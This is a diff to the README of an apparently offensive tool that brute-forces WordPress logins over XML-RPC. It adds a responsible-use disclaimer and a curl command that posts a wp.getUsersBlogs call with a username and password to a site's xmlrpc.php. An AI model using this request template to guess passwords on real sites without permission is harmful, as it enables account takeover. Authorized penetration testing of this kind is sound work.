@@ -45,3 +45,10 @@ The script sends XMLRPC requests to the xmlrpc.php endpoint, using the wp.getUse
 
 Disclaimer
 Use this script responsibly and only against sites for which you have explicit permission to test. Unauthorized testing can be illegal and unethical.
+
+The scripts is based on this curl command: 
+```
+
+curl -X POST -d "<methodCall><methodName>wp.getUsersBlogs</methodName><params><param><value>admin</value></param><param><value>CORRECT-PASSWORD</value></param></params></methodCall>" http://URL.com/xmlrpc.php
+
+```
